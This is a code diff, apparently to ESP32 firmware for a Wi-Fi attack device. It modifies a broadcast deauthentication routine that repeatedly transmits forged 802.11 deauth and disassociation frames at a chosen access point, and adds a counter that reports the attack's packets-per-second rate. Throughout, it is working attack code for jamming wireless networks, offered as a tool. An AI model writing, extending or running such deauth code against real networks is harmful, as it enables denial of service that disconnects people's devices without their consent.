@@ -53,6 +53,7 @@ esp_netif_t *wifiAP;
 esp_netif_t *wifiSTA;
 static uint32_t last_packet_time = 0;
 static uint32_t packet_counter = 0;
+static uint32_t deauth_packets_sent = 0;
 
 struct service_info {
     const char *query;
@@ -1131,15 +1132,19 @@ esp_err_t wifi_manager_broadcast_deauth(uint8_t bssid[6], int channel, uint8_t m
 
     // Send frames with rate limiting
     if (check_packet_rate()) {
-        esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
+        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
+        if(err == ESP_OK) deauth_packets_sent++;
         if (check_packet_rate()) {
-            esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
+            err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
+            if(err == ESP_OK) deauth_packets_sent++;
         }
         if (check_packet_rate()) {
-            esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
+            err = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
+            if(err == ESP_OK) deauth_packets_sent++;
         }
         if (check_packet_rate()) {
-            esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
+            err = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
+            if(err == ESP_OK) deauth_packets_sent++;
         }
     }
 
@@ -1163,16 +1168,20 @@ esp_err_t wifi_manager_broadcast_deauth(uint8_t bssid[6], int channel, uint8_t m
 
         // Send reverse frames with rate limiting
         if (check_packet_rate()) {
-            esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
+            esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
+            if(err == ESP_OK) deauth_packets_sent++;
         }
         if (check_packet_rate()) {
-            esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
+            esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
+            if(err == ESP_OK) deauth_packets_sent++;
         }
         if (check_packet_rate()) {
-            esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
+            esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
+            if(err == ESP_OK) deauth_packets_sent++;
         }
         if (check_packet_rate()) {
-            esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
+            esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
+            if(err == ESP_OK) deauth_packets_sent++;
         }
     }
 
@@ -1197,6 +1206,8 @@ void wifi_deauth_task(void *param) {
         return;
     }
 
+    uint32_t last_log = 0;
+    
     while (1) {
         if (strlen((const char *)selected_ap.ssid) > 0) {
             for (int i = 0; i < ap_count; i++) {
@@ -1219,24 +1230,30 @@ void wifi_deauth_task(void *param) {
                 }
             }
         }
-        // Add a small delay between iterations
         vTaskDelay(pdMS_TO_TICKS(100));
+        uint32_t now = xTaskGetTickCount() * portTICK_PERIOD_MS;
+        if (now - last_log >= 5000) {
+            TERMINAL_VIEW_ADD_TEXT("%d packets/sec\n", deauth_packets_sent/5);
+            printf("%lu packets/sec\n", deauth_packets_sent/5);
+            deauth_packets_sent = 0;
+            last_log = now;
+        }
+
     }
 }
 
 void wifi_manager_start_deauth() {
     if (!beacon_task_running) {
-        printf("Starting deauth transmission...\n");
-        TERMINAL_VIEW_ADD_TEXT("Starting deauth transmission...\n");
+        printf("Starting deauth\n");
+        TERMINAL_VIEW_ADD_TEXT("Starting deauth\n");
         ap_manager_stop_services();
         esp_wifi_start();
-        // Increase stack size to 4096
         xTaskCreate(wifi_deauth_task, "deauth_task", 4096, NULL, 5, &deauth_task_handle);
         beacon_task_running = true;
         rgb_manager_set_color(&rgb_manager, 0, 255, 0, 0, false);
     } else {
-        printf("Deauth transmission already running.\n");
-        TERMINAL_VIEW_ADD_TEXT("Deauth transmission already running.\n");
+        printf("Deauth already running.\n");
+        TERMINAL_VIEW_ADD_TEXT("Deauth already running.\n");
     }
 }
 
